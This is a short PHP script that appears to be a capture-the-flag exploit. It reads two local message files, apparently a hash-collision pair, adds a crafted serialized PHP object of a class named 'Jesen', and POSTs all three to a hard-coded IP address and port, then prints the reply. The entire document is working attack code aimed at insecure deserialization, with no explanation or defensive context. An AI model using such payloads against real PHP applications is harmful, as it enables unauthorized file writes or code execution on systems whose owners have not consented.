<?php
$postdata = http_build_query(
    array(
        'a' => file_get_contents("1_msg1.txt"),
        'b' => file_get_contents("1_msg2.txt"),
        'c' => "O:5:\"Jesen\":3:{s:8:\"filename\";N;s:7:\"content\";N;s:2:\"me\";N;}"
    )
);
$opts = array('http' =>
              array(
                  'method' => 'POST',
                  'header' => 'Content-type: application/x-www-form-urlencoded',
                  'content' => $postdata
              )
);
$context = stream_context_create($opts);
$result = file_get_contents('http://117.72.52.127:19459/', false, $context);
echo $result;
?>
